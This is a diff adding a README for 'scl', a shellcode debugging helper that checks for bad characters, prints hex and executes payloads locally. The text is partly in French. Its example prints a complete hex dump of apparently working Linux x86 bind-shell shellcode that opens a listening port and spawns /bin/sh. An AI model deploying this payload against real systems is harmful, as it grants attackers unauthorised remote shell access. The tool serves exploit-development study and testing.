@@ -1,0 +1,34 @@
+Helper for shellcode debugging. Load shellcode (for instance nasm assembly), execute it locally, display it and look for bad characters.
+
+It can be used to:
+    * Check that the shell code does not contain badchars ;
+    * Excecute shellcode locally to check its behavior ;
+    * Display shellcode in hex format, with the user's header choice (for instance \x90 or %90).
+
+It is an helper for those who develop their shellcodes manullay.
+It works under Linux and Win32. Should work with other OSes but I did not tried.
+
+Example
+First, use nasm to assemble the shellcode (simple binary, no elf or coff/pe format):
+$ nasm bindshell.asm
+
+Then use scl with the command line:
+
+    * -l : binaire à charger ;
+    * -d\\x : display avec headers \x (note: -d aurait suffit ; \x étant la sortie par défaut) ;
+    * -b000a0b0d : 0x00, 0x0a 0x0b 0x0d sont des badchars ; un message indique si ceux-ci ont été détectés ;
+    * -x : execution en local.
+
+(There are useless options to nop-pad the shellcode)
+
+$ scl/bin/scl -l bindshell -d\\x -b000a0b0d -x
+Loading shellcode data...
+Conversion to binary
+\x6a\x06\x58\x99\x50\xb0\x01\x50\x89\xc3\x40\x50\x89\xe1\xb0\x66\xcd\x80\x92\x50\u200b
+\x50\x50\x66\x68\x11\x11\xb0\x02\x66\x50\x89\xe7\xb0\x10\x50\x57\x52\x89\xe1\xb0\u200b
+\x66\xb3\x02\xcd\x80\x40\x50\x52\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb3\x10\x53\x50\u200b
+\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x93\xb0\x3f\x89\xc2\x31\xc9\xcd\x80\x89\xd0\u200b
+\x41\xcd\x80\x89\xd0\x41\xcd\x80\x6a\x31\x58\xcd\x80\x6a\x46\x5b\x93\x89\xd9\xcd\u200b
+\x80\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\u200b
+\x0c\x48\xcd\x80\x89\xd0\x89\xd3\x40\xcd\x80
+Testing shellcode
